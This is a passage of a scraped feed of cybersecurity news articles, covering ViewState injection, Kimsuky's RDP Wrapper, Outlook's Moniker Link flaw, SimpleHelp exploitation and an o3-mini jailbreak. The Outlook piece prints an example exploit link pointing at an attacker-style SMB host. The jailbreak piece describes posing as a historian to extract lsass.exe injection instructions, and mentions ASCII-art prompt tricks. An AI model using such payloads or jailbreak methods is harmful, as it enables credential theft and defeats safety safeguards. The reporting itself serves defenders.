        "Content": "Microsoft warns that attackers are deploying malware in ViewState code injection attacks using static ASP. NET machine keys found online.\nAs Microsoft Threat Intelligence experts recently discovered, some developers use ASP.NET validationKey and decryptionKey keys (designed to protect ViewState from tampering and information disclosure) found on code documentation and repository platforms in their own software.\nViewState enables ASP.NET Web Forms to control state and preserve user inputs across page reloads. However, if attackers get the machine key designed to protect it from tampering and information disclosure, they can use it in code injection attacks to craft malicious payloads by attaching crafted message authentication code (MAC).\nHowever, threat actors also use machine keys from publicly available sources in code injection attacks to create malicious ViewStates (used by ASP.NET Web Forms to control state and preserve pages) by attaching crafted message authentication code (MAC).\nWhen loading the ViewStates sent via POST requests, the ASP.NET Runtime on the targeted server decrypts and validates the attackers' maliciously crafted ViewState data because it uses the right keys, loads it into the worker process memory, and executes it.\nThis grants them remote code execution (RCE) on the targeted IIS web servers, allowing them to deploy additional malicious payloads.\nIn one instance, observed in December 2024, an unattributed attacker used a publicly known machine key to deliver the Godzilla post-exploitation framework, which features malicious command execution and shellcode injection capabilities, to a targeted Internet Information Services (IIS) web server.\nViewState code injection attack chain (Microsoft)\n\"Microsoft has since identified over 3,000 publicly disclosed keys that could be used for these types of attacks, which are called ViewState code injection attacks,\" the\ncompany said\non Thursday.\n\"Whereas many previously known ViewState code injection attacks used compromised or stolen keys that are often sold on dark web forums, these publicly disclosed keys could pose a higher risk because they are available in multiple code repositories and could have been pushed into development code without modification.\"\nTo block such attacks, Microsoft recommends developers securely generate machine keys, not use default keys or keys found online, encrypt machineKey and connectionStrings elements to block access to plaintext secrets, upgrade apps to use ASP.NET 4.8 to enable Antimalware Scan Interface (AMSI) capabilities, and harden Windows Servers by using\nattack surface reduction rules\nsuch as\nBlock Webshell creation for Servers\n.\nMicrosoft also shared detailed steps for removing or replacing ASP.NET keys in the web.config configuration file using either PowerShell or the IIS manager console and removed key samples from its public documentation to further discourage this insecure practice.\n\"If successful exploitation of publicly disclosed keys has occurred, rotating machine keys will not sufficiently address possible backdoors or persistence methods established by a threat actor or other post-exploitation activity, and additional investigation may be warranted,\" Redmond warned.\n\"In particular, web-facing servers should be fully investigated and strongly considered for re-formatting and re-installation in an offline medium in cases where publicly disclosed keys have been identified, as these servers are most at risk of possible exploitation.\"\nRelated Articles:\nBrave now lets you inject custom JavaScript to tweak websites\nCrypto-stealing apps found in Apple App Store for the first time\nNew Aquabotv3 botnet malware targets Mitel command injection flaw\nHacker infects 18,000 \"script kiddies\" with fake malware builder\nHundreds of fake Reddit sites push Lumma Stealer malware"
    },
    {
        "Title": "Kimsuky hackers use new custom RDP Wrapper for remote access",
        "Link": "https://www.bleepingcomputer.com/news/security/kimsuky-hackers-use-new-custom-rdp-wrapper-for-remote-access/",
        "Summary": "The North Korean hacking group known as Kimsuky was observed in recent attacks using a custom-built RDP Wrapper and proxy tools to directly access infected machines. [...]",
        "Date": "2025-02-06",
        "Content": "The North Korean hacking group known as Kimsuky was observed in recent attacks using a custom-built RDP Wrapper and proxy tools to directly access infected machines.\nThis is a sign of shifting tactics for Kimsuky, according to AhnLab SEcurity Intelligence Center (ASEC), who discovered the campaign.\nASEC says the North Korean hackers now use a diverse set of customized remote access tools instead of relying solely on noisy backdoors like PebbleDash, which is still used.\nKimsuky's latest attack chain\nThe latest infection chain starts with a spear-phishing email containing a malicious shortcut (.LNK) file attachment disguised as a PDF or Word document.\nThe emails contain the recipient's name and correct company names, suggesting that Kimsuky performed reconnaissance before the attack.\nOpening the .LNK file triggers PowerShell or Mshta to retrieve additional payloads from an external server, including:\nPebbleDash, a known Kimsuky backdoor providing initial system control.\nA modified version of the open-source RDP Wrapper tool, enabling persistent RDP access and security measures bypass.\nProxy tools for bypassing private network restrictions, allowing attackers to access the system even when direct RDP connections are blocked.\nCustom RDP Wrapper\nRDP Wrapper is a legitimate open-source tool designed to enable Remote Desktop Protocol (RDP) functionality on Windows versions that do not natively support it, like Windows Home.\nIt acts as a middle layer, allowing users to enable remote desktop connections without modifying system files.\nKimsuky's version altered export functions to bypass antivirus detection and likely differentiates its behavior enough to evade signature-based detection.\nCustom RDP Wrapper export functions\nSource: ASEC\nThe main advantage of using a custom RDP Wrapper is detection evasion, as RDP connections are often treated as legitimate, allowing Kimsuky to stay under the radar for longer.\nMoreover, it provides a more comfortable GUI-based remote control, compared to shell access via malware, and can bypass firewalls or NAT restrictions via relays, allowing RDP access from outside.\nASEC\nreports\nthat once Kimsuky secures their foothold on the network, they drop secondary payloads.\nThese include a keylogger that captures keystrokes and stores them in text files in system directories, an infostealer (forceCopy) that extracts credentials saved on web browsers, and a PowerShell-based ReflectiveLoader that enables in-memory payload execution.\nOverall, Kimsuky is a\npersistent\nand\nevolving\nthreat and one of North Korea's\nmost prolific\ncyber-espionage\nthreat groups devoted to\ncollecting intelligence\n.\nASEC's latest findings indicate that the threat actors switch to stealthier remote access methods for prolonged dwell times in compromised networks.\nRelated Articles:\nThe Advantages of Cloud-Based Remote Desktop versus RDP over VPN\nFBI: North Korean IT workers steal source code to extort employers\nUS cracks down on North Korean IT worker army with more sanctions\nUS govt says North Korea stole over $659 million in crypto last year\nUS charges operators of cryptomixers linked to ransomware gangs"
    },
    {
        "Title": "Critical RCE bug in Microsoft Outlook now exploited in attacks",
        "Link": "https://www.bleepingcomputer.com/news/security/critical-rce-bug-in-microsoft-outlook-now-exploited-in-attacks/",
        "Summary": "CISA warned U.S. federal agencies on Thursday to secure their systems against ongoing attacks targeting a critical Microsoft Outlook remote code execution (RCE) vulnerability. [...]",
        "Date": "2025-02-06",
        "Content": "CISA warned U.S. federal agencies on Thursday to secure their systems against ongoing attacks targeting a critical Microsoft Outlook remote code execution (RCE) vulnerability.\nDiscovered by Check Point vulnerability researcher Haifei Li and tracked as\nCVE-2024-21413\n, the flaw is caused by improper input validation when opening emails with malicious links using vulnerable Outlook versions.\nThe attackers gain remote code execution capabilities because the flaw lets them bypass the Protected View (which should block harmful content embedded in Office files by opening them in read-only mode) and open malicious Office files in editing mode.\nWhen it patched CVE-2024-21413 one year ago, Microsoft also warned that the Preview Pane is an attack vector, allowing successful exploitation even when previewing maliciously crafted Office documents.\nAs\nCheck Point explained\n, this security flaw (dubbed Moniker Link) lets threat actors bypass built-in Outlook protections for malicious links embedded in emails using the file:// protocol and by adding an exclamation mark to URLs pointing to attacker-controlled servers.\nThe exclamation mark is added right after the file extension, together with random text (in their example, Check Point used \"something\"), as shown below:\n*<a href=\"file:///\\\\10.10.111.111\\test\\test.rtf!something\">CLICK ME</a>*\nCVE-2024-21413 affects multiple Office products, including Microsoft Office LTSC 2021, Microsoft 365 Apps for Enterprise, Microsoft Outlook 2016, and Microsoft Office 2019, and successful CVE-2024-21413 attacks can result in the theft of NTLM credentials and the execution of arbitrary code via maliciously crafted Office documents.\nOn Thursday, CISA\nadded\nthe vulnerability to its Known Exploited Vulnerabilities (KEV) catalog, marking it as actively exploited. As mandated by the Binding Operational Directive (BOD) 22-01, federal agencies must secure their networks within three weeks by February 27.\n\"These types of vulnerabilities are frequent attack vectors for malicious cyber actors and pose significant risks to the federal enterprise,\" the cybersecurity agency\nwarned\n.\nWhile CISA primarily focuses on alerting federal agencies about vulnerabilities that should be patched as soon as possible, private organizations are also advised to prioritize patching these flaws to block ongoing attacks.\nRelated Articles:\nCISA confirms critical Cleo bug exploitation in ransomware attacks\nHackers exploit Cityworks RCE bug to breach Microsoft IIS servers\nHackers exploit KerioControl firewall flaw to steal admin CSRF tokens\nNew Cleo zero-day RCE flaw exploited in data theft attacks\nCISA tags Microsoft .NET and Apache OFBiz bugs as exploited in attacks"
    },
    {
        "Title": "Hackers exploit SimpleHelp RMM flaws to deploy Sliver malware",
        "Link": "https://www.bleepingcomputer.com/news/security/hackers-exploit-simplehelp-rmm-flaws-to-deploy-sliver-malware/",
        "Summary": "Hackers are targeting vulnerable SimpleHelp RMM clients to create administrator accounts, drop backdoors, and potentially lay the groundwork for ransomware attacks. [...]",
        "Date": "2025-02-06",
        "Content": "Hackers are targeting vulnerable SimpleHelp RMM clients to create administrator accounts, drop backdoors, and potentially lay the groundwork for ransomware attacks.\nThe flaws are tracked as CVE-2024-57726, CVE-2024-57727, and CVE-2024-57728 and were reported as potentially actively exploited by\nArctic Wolf\nlast week. However, the cybersecurity firm could not confirm for sure if the flaws were used.\nCybersecurity firm Field Effect has confirmed to BleepingComputer that the flaws are being exploited in recent attacks and released\na report\nthat sheds light on the post-exploitation activity.\nAdditionally, the cybersecurity researchers mention that the observed activity has signs of Akira ransomware attacks, though they do not hold enough evidence to make a high-confidence attribution.\nTargeting SimpleHelp RMM\nThe attack started with the threat actors exploiting the vulnerabilities in the SimpleHelp RMM client to establish an unauthorized connection to a target endpoint.\nThe attackers connected from the IP 194.76.227[.]171, an Estonian-based server running a SimpleHelp instance on port 80.\nOnce connected via RMM, the attackers quickly executed a series of discovery commands to learn more about the target environment, including system and network details, users and privileges, scheduled tasks and services, and domain controller information.\nField Effect also observed a command that searched for the CrowdStrike Falcon security suite, likely a bypass attempt bypass.\nLeveraging their access and knowledge, the attackers then proceeded to create a new administrator account named \"sqladmin\" to maintain access to the environment, followed by the installation of the Sliver post-exploitation framework (agent.exe).\nSliver is a post-exploitation framework developed by BishopFox that has seen\nincreased usage over the past couple of years\nas an alternative to Cobalt Strike, which is increasingly detected by endpoint protection.\nWhen deployed, Sliver will connect back to a command and control server (C2) to open a reverse shell or wait for commands to execute on the infected host.\nThe Sliver beacon observed in the attack was configured to connect to a C2 in the Netherlands. Field Effect also identified a backup IP with Remote Desktop Protocol (RDP) enabled.\nWith persistence established, the attackers moved deeper into the network by compromising the Domain Controller (DC) using the same SimpleHelp RMM client and creating another admin account (\"fpmhlttech\").\nInstead of the backdoor, the attackers installed a Cloudflare Tunnel disguised as Windows svchost.exe to maintain stealthy access and bypass security controls and firewalls.\nProtecting SimpleHelp from attacks\nSimpleHelp users are advised to apply the available security updates that address CVE-2024-57726, CVE-2024-57727, and CVE-2024-57728 as soon as possible. For more info,\ncheck the vendor's bulletin\n.\nAdditionally, look for administrator accounts named 'sqladmin' and 'fpmhlttech,' or any others you don't recognize, and look for connections to the IPs listed in Field Effect's report.\nUltimately, users should restrict SimpleHelp access to trusted IP ranges to prevent unauthorized access.\nRelated Articles:\nHackers exploiting flaws in SimpleHelp RMM to breach networks\nHackers exploit Cityworks RCE bug to breach Microsoft IIS servers\nCISA tags Microsoft .NET and Apache OFBiz bugs as exploited in attacks\nZyxel won’t patch newly exploited flaws in end-of-life routers\n7-Zip MotW bypass exploited in zero-day attacks against Ukraine"
    },
    {
        "Title": "Cybercrime Forces Local Law Enforcement to Shift Focus",
        "Link": "https://www.darkreading.com/cyberattacks-data-breaches/cybercrime-forces-local-law-enforcement-to-shift-focus",
        "Summary": "Local law enforcements need to steer away from &quot;place-based policing&quot; when investigating cybercrimes.",
        "Date": "2025-02-06",
        "Content": "TechTarget and Informa Tech’s Digital Business Combine.TechTarget and Informa\nTogether, we power an unparalleled network of 220+ online properties covering 10,000+ granular topics, serving an audience of 50+ million professionals with original, objective content from trusted sources. We help you gain critical insights and make more informed decisions across your business priorities.\nCybersecurity In-Depth: Feature articles on security strategy, latest trends, and people to know.\nLocal law enforcements need to steer away from \"place-based policing\" when investigating cybercrimes.\nFebruary 6, 2025\nLast November, an Idaho man was sentenced to 10 years in prison for hacking into the computer servers of 19 victims across the United States, stealing personally identifiable information (PII) belonging to more than 132,000 people, and attempting to extort a Florida orthodontist for payment in Bitcoin cryptocurrency.\nThe perpetrator, Robert Purbeck, had also purchased access to the computer server belonging to a medical clinic in Griffin, Ga., from a cybersecurity forum and used stolen credentials to remove records containing sensitive PII, such as birth dates and Social Security numbers for 43,000 individuals, according to the US Department of Justice. In addition, Purbeck purchased access to a server belonging to the police department of Newnan, Ga., and stolen police reports and other documents, including the PII for over 14,000 people.\nThis case illustrates some of the challenges law enforcement currently face trying to investigate and arrest criminals in an increasingly digital world where cybercriminals operate across state — and often national — lines, employing a variety of tools. While the FBI plays a significant role in investigating cybercrime, most of the responsibility often falls to local law enforcement — municipal police departments, county sheriff's offices, and other local agencies. These groups have to determine jurisdiction and secure limited resources while staying on top of the ever-evolving threat landscape.\nIn 2023, the Federal Bureau of Investigation's Internet Crime Complaint Center (IC3) received 880,418 cybercrime complaints, a nearly 10% increase from 2022. Potential losses exceeded $12.5 billion, up 22% from 2022. While the figures for 2024 are not yet available, the numbers are expected to be even higher.\nAt the top of the list is a need to evolve beyond place-based policing, says Dr. Chris Moloney, an instructor at Colorado State University whose research focuses on the digital transformation of public safety agencies.\n\"One of the greatest challenges is that [local] agencies have historically evolved to be place-based, and they've been resourced to deal with physical, tangible crimes, burglaries, robberies, arsons, homicides, all those that show up on TV shows and in the newspapers,\" he says. \"But cybercrime is borderless. Your perpetrator could be thousands of miles away, and your victims could be in your small local town that has a police department with 15 employees. That's a fundamental challenge.\"\nIn addition to questions of place and jurisdiction, Moloney says local law enforcement also suffers from resource and \"capability gaps.\" Local police departments may struggle to allocate budgets for software that can analyze forensic evidence or hire personnel with expertise in areas like encryption or blockchain.\nAnd prioritizing cybercrime often takes a back seat to the day-to-day issues facing a local community.\n“When I want to make sure that my neighborhood's safe, it's a very, very challenging dynamic for leadership to go to the community or to go to their local government and say, 'We need more money specifically for these technological resources,'\" Moloney says.\nLaw enforcement also has to compete for talent with the private sector, which can afford to pay higher salaries to those with cyberskills, Moloney says. However, law enforcement also needs to work in partnership with the private sector to investigate and prosecute some kinds of cybercrime. \n\"One of the best solutions is a better defense, right? And that's where the private sector comes in in a big way,\" he says. \"And that's where education comes in a big way.\"\nIn addition to enhanced partnerships with the private sector, fighting the rise of cybercrime will require finding ways to bring agencies and law enforcement groups together and making cybercrime a priority by providing increased financial and technological resources and staffing.\n\"We do not have a unified or coherent strategy or set of tactics or solutions that unify how everybody's approaching this issue,\" Moloney says. \"It's a challenging environment, and it's really complicated. How do we navigate all those different issues that are all coming together at the same time and recognize that if you don't do it, it's only going to get worse?\"\nJennifer Lawinski\nContributing Writer\nJennifer Lawinski is a writer and editor with more than 20 years experience in media, covering a wide range of topics including business, news, culture, science, technology and cybersecurity. After earning a Master's degree in Journalism from Boston University, she started her career as a beat reporter for The Daily News of Newburyport. She has since written for a variety of publications including CNN, Fox News, Tech Target, CRN, CIO Insight, MSN News and Live Science. She lives in Brooklyn with her partner and two cats.\nYou May Also Like\nUncovering Threats to Your Mainframe & How to Keep Host Access Secure\nSecuring the Remote Workforce\nEmerging Technologies and Their Impact on CISO Strategies\nHow CISOs Navigate the Regulatory and Compliance Maze\nWhere Does Outsourcing Make Sense for Your Organization?\n[Conference] Black Hat USA - August 2-7 - Learn More\n[Conference] Black Hat Asia - April 1-4 - Learn More\n[Dark Reading Virtual Event] Cybersecurity's Most Promising New and Emerging Technologies\nHow Are Modern Fraud Groups Using GenAI and Deepfakes?\nInteractive Online Training for Cybersecurity Professionals; Earn CPE Credits\nName That Edge Toon: In the Cloud\nState Data Privacy Regulators Are Coming. What Story Will You Tell Them?\nCopyright © 2025. This website is owned and operated by Informa TechTarget, part of a global network that informs, influences and connects the world’s technology buyers and sellers. All copyright resides with them. Informa PLC’s registered office is 5 Howick Place, London SW1P 1WG. Registered in England and Wales. TechTarget, Inc.’s registered office is 275 Grove St. Newton, MA 02466."
    },
    {
        "Title": "7AI Streamlines Security Operations With Autonomous AI Agents",
        "Link": "https://www.darkreading.com/cybersecurity-operations/7ai-streamlines-security-operations-with-autonomous-ai-agents",
        "Summary": "Cybereason co-founders launch their second act with a security startup focused on offering a platform that uses agentic AI to offload repetitive tasks commonly performed by security analysts.",
        "Date": "2025-02-06",
        "Content": "TechTarget and Informa Tech’s Digital Business Combine.TechTarget and Informa\nTogether, we power an unparalleled network of 220+ online properties covering 10,000+ granular topics, serving an audience of 50+ million professionals with original, objective content from trusted sources. We help you gain critical insights and make more informed decisions across your business priorities.\nNews, news analysis, and commentary on the latest trends in cybersecurity technology.\nCybereason co-founders launch their second act with a security startup focused on offering a platform that uses agentic AI to offload repetitive tasks commonly performed by security analysts.\nFebruary 6, 2025\nThe co-founders of EDR provider Cybereason have regrouped with a new security startup, 7AI, to help organizations shift the burden of performing repetitive and routine security tasks currently performed by human analysts onto AI. 7AI's Agentic AI Platform frees security professionals from time-consuming tasks, such as triaging alerts, interpreting signals, correlating telemetry, and hunting for known threats, says Lior Div, one of the co-founders.\nDiv and Yonatan Striem-Amit left Cybereason two years ago after Softbank took a majority stake in the company; they founded 7AI in April 2024. The startup, which emerged from stealth on Thursday, says more than a dozen companies, mostly large and midsize enterprises, are already using its Agentic AI Platform. 7AI also received $36 million in seed funding from Greylock Partners, Spark Capital, and CRV.\nDiv describes agentic AI as \"swarms of AI agents\" capable of autonomously taking on routine security tasks. Unlike isolated generative AI agents, these swarms can enable autonomous operations by pooling and communicating their intelligence to investigate and prioritize threats while optimizing system resources. A swarm of agents working in tandem means that one agent could be configured to discover suspicious telemetry in an endpoint detection and response (EDR) system while another could be configured to validate the potential threat by correlating cloud logs. Yet another agent could be configured to observe user behavior patterns in identity and access management (IAM) systems. \n\"Instead of spending their time on repetitive work to respond to alerts, our early customers are able to start their work with full context, drastically fewer false positives, and the results of full investigations,\" Div explained in a blog post announcing the company's new platform. The platform documents how each agent reached its conclusions and can be reviewed at any time by human analysts.\n7AI's agentic AI capabilities, which is hosted in the Amazon Web Services cloud, is built with generative AI tools from Open AI and Anthropic.\n\"When it comes to reasoning, we're using Open AI,\" Div tells Dark Reading. \"But when it comes to actually implementing and writing code, we're using Anthropic.\"\nThe platform is not designed to replace security administrators and analysts but rather allow them to take mundane tasks off their plates so they can allocate their time to more strategic functions.\n\"AI will take away 90% of the boring, toiling work,\" Div says.\nBesides handling repetitive tasks, 7AI's platform is designed to correlate telemetry without moving data into another system. For example, in a typical threat hunting scenario, the data would have to be pushed into a security information and event management (SIEM). Instead, 7AI correlates the information at its source. The platform can also detect threat activity and anomalies in IAM systems such as Okta, Div says.\n\"We believe our AI will meet the data where the data was born,\" he says. \"You don't have to send a lot of those pieces to the SIEM anymore.\"\nThis could also reduce organizations' reliance on managed security and service providers or managed detection and response providers, Div suggests.\n\"We don't think that you will need a SOAR once you have our system because it will decide on the fly what is the right playbook to run and what type of investigation to conduct without the need for human beings to specify it step by step,\" Div says.\nJeffrey Schwartz\nContributing Writer\nJeffrey Schwartz is a journalist who has covered information security and all forms of business and enterprise IT, including client computing, data center and cloud infrastructure, and application development for more than 30 years. Jeff is a regular contributor to Channel Futures. Previously, he was editor-in-chief of Redmond magazine and contributed to its sister titles Redmond Channel Partner, Application Development Trends, and Virtualization Review. Earlier, he held editorial roles with CommunicationsWeek, InternetWeek, and VARBusiness. Jeff is based in the New York City suburb of Long Island.\nYou May Also Like\nUncovering Threats to Your Mainframe & How to Keep Host Access Secure\nSecuring the Remote Workforce\nEmerging Technologies and Their Impact on CISO Strategies\nHow CISOs Navigate the Regulatory and Compliance Maze\nWhere Does Outsourcing Make Sense for Your Organization?\n[Conference] Black Hat USA - August 2-7 - Learn More\n[Conference] Black Hat Asia - April 1-4 - Learn More\n[Dark Reading Virtual Event] Cybersecurity's Most Promising New and Emerging Technologies\nDatabarracks Launches Air Gap Recover\nBackline Tackles Enterprise Security Backlogs With AI\nMicrosoft Sets End Date for Defender VPN\nTenable to Acquire Vulcan Cyber to Boost Exposure Management Focus\nCopyright © 2025. This website is owned and operated by Informa TechTarget, part of a global network that informs, influences and connects the world’s technology buyers and sellers. All copyright resides with them. Informa PLC’s registered office is 5 Howick Place, London SW1P 1WG. Registered in England and Wales. TechTarget, Inc.’s registered office is 275 Grove St. Newton, MA 02466."
    },
    {
        "Title": "Researcher Outsmarts, Jailbreaks OpenAI's New o3-mini",
        "Link": "https://www.darkreading.com/application-security/researcher-jailbreaks-openai-o3-mini",
        "Summary": "OpenAI's latest tech can reason better than its previous models could, but not well enough to ferret out careful social engineering.",
        "Date": "2025-02-06",
        "Content": "TechTarget and Informa Tech’s Digital Business Combine.TechTarget and Informa\nTogether, we power an unparalleled network of 220+ online properties covering 10,000+ granular topics, serving an audience of 50+ million professionals with original, objective content from trusted sources. We help you gain critical insights and make more informed decisions across your business priorities.\nOpenAI's latest tech can reason better than its previous models could, but not well enough to ferret out careful social engineering.\nFebruary 6, 2025\nA prompt engineer has challenged the ethical and safety protections in OpenAI's latest o3-mini model, just days after its release to the public.\nOpenAI unveiled o3 and its lightweight counterpart, o3-mini, on Dec. 20. That same day, it also introduced a brand new security feature: \"deliberative alignment.\" Deliberative alignment \"achieves highly precise adherence to OpenAI's safety policies,\" the company said, overcoming the ways in which its models were previously vulnerable to jailbreaks.\nLess than a week after its public debut, however, CyberArk principal vulnerability researcher Eran Shimony got o3-mini to teach him how to write an exploit of the Local Security Authority Subsystem Service (lsass.exe), a critical Windows security process.\nIn introducing deliberative alignment, OpenAI acknowledged the ways its previous large language models (LLMs) struggled with malicious prompts. \"One cause of these failures is that models must respond instantly, without being given sufficient time to reason through complex and borderline safety scenarios. Another issue is that LLMs must infer desired behavior indirectly from large sets of labeled examples, rather than directly learning the underlying safety standards in natural language,\" the company wrote.\nDeliberative alignment, it claimed, \"overcomes both of these issues.\" To solve issue number one, o3 was trained to stop and think, and reason out its responses step by step using an existing method called chain of thought (CoT). To solve issue number two, it was taught the actual text of OpenAI's safety guidelines, not just examples of good and bad behaviors.\n\"When I saw this recently, I thought that [a jailbreak] is not going to work,\" Shimony recalls. \"I'm active on Reddit, and there people were not able to jailbreak it. But it is possible. Eventually it did work.\"\nShimony has vetted the security of every popular LLM using his company's open source (OSS) fuzzing tool, \"FuzzyAI.\" In the process, each one has revealed its own characteristic weaknesses.\n\"OpenAI's family of models is very susceptible to manipulation types of attacks,\" he explains, referring to regular old social engineering in natural language. \"But Llama, made by Meta, is not, but it's susceptible to other methods. For instance, we've used a method in which only the harmful component of your prompt is coded in an ASCII art.\"\n\"That works quite well on Llama models, but it does not work on OpenAI's, and it does not work on Claude whatsoever. What works on Claude quite well at the moment is anything related to code. Claude is very good at coding, and it tries to be as helpful as possible, but it doesn't really classify if code can be used for nefarious purposes, so it's very easy to use it to generate any kind of malware that you want,\" he claims.\nShimony acknowledges that \"o3 is a bit more robust in its guardrails, in comparison to GPT-4, because most of the classic attacks do not really work.\" Still, he was able to exploit its long-held weakness by posing as an honest historian in search of educational information.\nIn the exchange below, his aim is to get ChatGPT to generate malware. He phrases his prompt artfully, so as to conceal its true intention, then the deliberative alignment-powered ChatGPT reasons out its response:\nSource: Eran Shimony via LinkedIn\nDuring its CoT, however, ChatGPT appears to lose the plot, eventually producing detailed instructions for how to inject code into lsass.exe, a system process that manages passwords and access tokens in Windows.\nSource: Eran Shimony via LinkedIn\nIn an email to Dark Reading, an OpenAI spokesperson acknowledged that Shimony may have performed a successful jailbreak. They highlighted, though, a few possible points against: that the exploit he obtained was pseudocode, that it was not new or novel, and that similar information could be found by searching the open Web.\nShimony foresees an easy way, and a hard way that OpenAI can help its models better identify jailbreaking attempts.\nThe more laborious solution involves training o3 on more of the types of malicious prompts it struggles with, and whipping it into shape with positive and negative reinforcement.\nAn easier step would be to implement more robust classifiers for identifying malicious user inputs. \"The information I was trying to retrieve was clearly harmful, so even a naive type of classifier could have caught it,\" he thinks, citing Claude as an LLM that does better with classifiers. \"This will solve roughly 95% of jailbreaking [attempts], and it doesn't take a lot of time to do.\"\nDark Reading has reached out to OpenAI for comment on this story.\nNate Nelson, Contributing Writer\n\nNate Nelson is a writer based in New York City. He formerly worked as a reporter at Threatpost, and wrote \"Malicious Life,\" an award-winning Top 20 tech podcast on Apple and Spotify. Outside of Dark Reading, he also co-hosts \"The Industrial Security Podcast.\"\nYou May Also Like\nUncovering Threats to Your Mainframe & How to Keep Host Access Secure\nSecuring the Remote Workforce\nEmerging Technologies and Their Impact on CISO Strategies\nHow CISOs Navigate the Regulatory and Compliance Maze\nWhere Does Outsourcing Make Sense for Your Organization?\n[Conference] Black Hat USA - August 2-7 - Learn More\n[Conference] Black Hat Asia - April 1-4 - Learn More\n[Dark Reading Virtual Event] Cybersecurity's Most Promising New and Emerging Technologies\nThe State of Firewall Security: Challenges, Risks, and Solutions for Modern Networks\nIndustrial Networks in the Age of Digitalization\nZero-Trust Adoption Driven by Data Protection, Cloud Access Control, and Regulatory Compliance Requirements\nThreat Hunting's Evolution: From On-Premises to the Cloud\nHow Enterprises Secure Their Applications\nUncovering Threats to Your Mainframe & How to Keep Host Access Secure\nSecuring the Remote Workforce\nEmerging Technologies and Their Impact on CISO Strategies\nHow CISOs Navigate the Regulatory and Compliance Maze\nWhere Does Outsourcing Make Sense for Your Organization?\nDelivering Globally Consistent App Performance to the Hybrid Workforce\nSecure remote access. Simplified.\nThe State of Firewall Security: Challenges, Risks, and Solutions for Modern Networks\nUnderstanding Social Engineering Attacks and What To Do About Them\nSolution Brief: Introducing the runZero Platform\n[Conference] Black Hat USA - August 2-7 - Learn More\n[Conference] Black Hat Asia - April 1-4 - Learn More\n[Dark Reading Virtual Event] Cybersecurity's Most Promising New and Emerging Technologies\nCopyright © 2025. This website is owned and operated by Informa TechTarget, part of a global network that informs, influences and connects the world’s technology buyers and sellers. All copyright resides with them. Informa PLC’s registered office is 5 Howick Place, London SW1P 1WG. Registered in England and Wales. TechTarget, Inc.’s registered office is 275 Grove St. Newton, MA 02466."
    },
    {
        "Title": "US Cybersecurity Efforts for Spacecraft Are Up in the Air",
        "Link": "https://www.darkreading.com/threat-intelligence/us-cybersecurity-spacecraft",
        "Summary": "While President Trump supported federal space efforts during his first administration, the addition of SpaceX chief Elon Musk to his circle likely means challenges for regulating spacecraft cybersecurity, experts say.",
        "Date": "2025-02-06",
        "Content": "TechTarget and Informa Tech’s Digital Business Combine.TechTarget and Informa\nTogether, we power an unparalleled network of 220+ online properties covering 10,000+ granular topics, serving an audience of 50+ million professionals with original, objective content from trusted sources. We help you gain critical insights and make more informed decisions across your business priorities.\nWhile President Trump supported federal space efforts during his first administration, the addition of SpaceX chief Elon Musk to his circle likely means challenges for regulating spacecraft cybersecurity, experts say.\nFebruary 6, 2025\nThe cybersecurity of satellites, spacecraft, and other space-based systems continues to lag behind current threats, despite efforts by the National Aeronautics and Space Administration (NASA) to require that contractors shore up electronic protections for the hardware and software provided to the US space program.\nThe cybersecurity gaps will likely only grow worse as the Trump administration's efforts to deregulate private industry accelerates, and as Elon Musk — the CEO of the largest private space company, SpaceX —  pushes for less stringent requirements for spacecraft and launch-system manufacturers, experts say. The company's lobbyists have already reportedly pushed to disband the National Space Council (NSpC), a group of experts established during the George H.W. Bush administration that develops policies and guidelines for US space programs.\nMeanwhile, the United States and its commercial contractors must keep up with an accelerating threat landscape, says Samuel Sanders Visner, a technical fellow at the Aerospace Corporation, a federally funded research and development center, who also serves as chairman of the board of the Space Information Sharing and Analysis Center (Space ISAC).\n\"Our potential adversaries understand the critical nature of our space systems to our national and economic security, [so] we can expect they will continue to develop the means to hold at risk these systems,\" he says. \"We must redouble our own efforts to stay ahead of adversaries' capabilities.\"\nRelated:2024 Breaks Records With Highest Ever Ransomware Attacks\nAnd indeed, threats to space-based systems have increased. Russia-linked hackers disrupted satellite communications in Ukraine during the opening months of its invasion, and researchers are concerned about the potential satellite-hacking capabilities of China and Iran.\nBecause so much of the US space infrastructure now relies on private manufacturers, those organizations need to make sure they meet stringent levels of cybersecurity, says Josh Taylor, lead cybersecurity analyst at Fortra, an automated cybersecurity provider. In July 2024, two Democratic US representatives, Maxwell Alejandro Frost (Fla.-10) and Don Beyer (Va.-8) introduced a bill, the Spacecraft Cybersecurity Act, that would require manufacturers to adopt cybersecurity requirements to supply NASA with spacecraft. No actions have been taken on the bill.\n\"Spacecraft manufacturers are not proactively doing enough to ensure cybersecurity best practices, as evidenced by the original need for the Spacecraft Cybersecurity Act and the lack of progress in adopting large-scale changes since its proposal,\" Taylor says. \"The delay is particularly concerning in today's heightened threat environment, given the recent renewed attention on supply chain breaches targeting government systems.\"\nRelated:Credential Theft Becomes Cybercriminals' Favorite Target\nSuch legislation may not get much attention in the current political climate. The Trump administration's off-the-cuff approach to setting policy has made the future of the space program — never mind its cybersecurity — a large question mark. While Trump has focused on space-based initiatives in the past — such as establishing the US Space Command in his first administration, and pledging last month to support programs to land Americans on Mars (a Musk pet project) — cybersecurity-focused regulatory efforts will likely face significant hurdles.\nThe Biden administration made some progress in cybersecurity but failed to require private contractors to commit to cybersecurity plans. In a flurry of eleventh-hour executive orders in January, the Biden administration issued a wide-ranging mandate to boost cybersecurity using contract requirements and the federal government's purchasing power. Among the provisions are stipulations that NASA and other civilian agencies create cybersecurity requirements for government-contracted systems, and inventory the existing cybersecurity protections of the ground systems that support space missions.\nRelated:Ferret Malware Added to 'Contagious Interview' Campaign\nYet the Trump administration has already reversed several of the previous administration's executive orders and regulations in general, and the threat to undo the National Space Council remains real.\n\"How important is outer space to the new administration? That's still an open question,\" says Patrick Lin, director of the Ethics + Emerging Sciences Group at California Polytechnic State University (Cal Poly), and a member of the NSpC's User Advisory Group. \"Without [the NSpC], we might see a single point of failure, if it's just the White House trying to tackle space policy alone — which already seems low on their agenda and thus may likely be under-staffed.\"\nMusk, meanwhile, has pushed back on regulations for commercial providers, including SpaceX, the dominant maker of private launch systems and spacecraft. The company accounted for more than half (52%) of 259 worldwide launches in 2024. Before attaching himself to the Trump administration, Musk — and SpaceX — had fallen afoul of environmental regulators and federal reporting standards for handling sensitive information.\nA single private citizen has seldom, if ever, wielded as much influence over the US government as SpaceX's Musk, who has been designated a \"special government employee\" and whose team — the Department of Government Efficiency, or DOGE — has moved to cut specific programs and agencies.\nBut even without the threat of a private citizen with conflicts of interest cutting NASA's regulatory efforts, boosting cybersecurity for spacecraft is not an easy task.\nNASA, a historically popular target of hackers, 